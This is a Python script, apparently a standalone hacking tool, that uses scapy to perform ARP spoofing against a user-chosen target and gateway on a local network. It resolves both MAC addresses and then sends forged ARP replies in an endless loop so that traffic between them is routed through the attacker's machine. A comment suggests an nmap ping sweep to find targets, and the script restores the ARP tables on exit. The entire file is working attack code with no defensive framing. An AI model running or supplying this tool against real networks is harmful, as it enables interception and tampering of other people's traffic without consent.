import sys
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp

'''To find the target and the gateway ip address you can either check the device manually or use nmap like
sudo nmap -sn -T4 <your ip gateway>/24 '''


#extract MAC address from provided ip
def MacFromip(ip):
    pkt=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,pdst=ip)
    try:
        response=srp(pkt,timeout=2,verbose=False)[0][0][1].hwsrc
    except:
        print("Couldn't reach Ip Address")
        sys.exit()
    return(response)

def spoof(gatewayIp,targetIp,gatewayMac,targetMac):
    #spoof the gateway
    gateSpoof=ARP(op=2,psrc=gatewayIp,pdst=targetIp,hwdst=targetMac)
    send(gateSpoof, verbose=False)

    #spoof the target
    targetSpoof=ARP(op=2,psrc=targetIp,pdst=gatewayIp,hwdst=gatewayMac)
    send(targetSpoof,verbose=False)

gatewayIp=input("Enter the IP address of gateway")
targetIp=input("Enter the IP address of the target")
gatewayMac=MacFromip(gatewayIp)
print("gateway Mac Address = {}".format(gatewayMac))
targetMac=MacFromip(targetIp)
print("target Mac Address = {}".format(targetMac))
print("sending spoof packets...")
try:
    while True:
        spoof(gatewayIp,targetIp,gatewayMac,targetMac)
except KeyboardInterrupt:
    print("Closing...")
    #correct the arp table before exiting
    gateSpoof=ARP(op=2,psrc=gatewayIp,hwsrc=gatewayMac,pdst=targetIp,hwdst=targetMac)
    send(gateSpoof, verbose=False)
    targetSpoof=ARP(op=2,psrc=targetIp,hwsrc=targetMac,pdst=gatewayIp,hwdst=gatewayMac)
    send(targetSpoof,verbose=False)
    sys.exit()
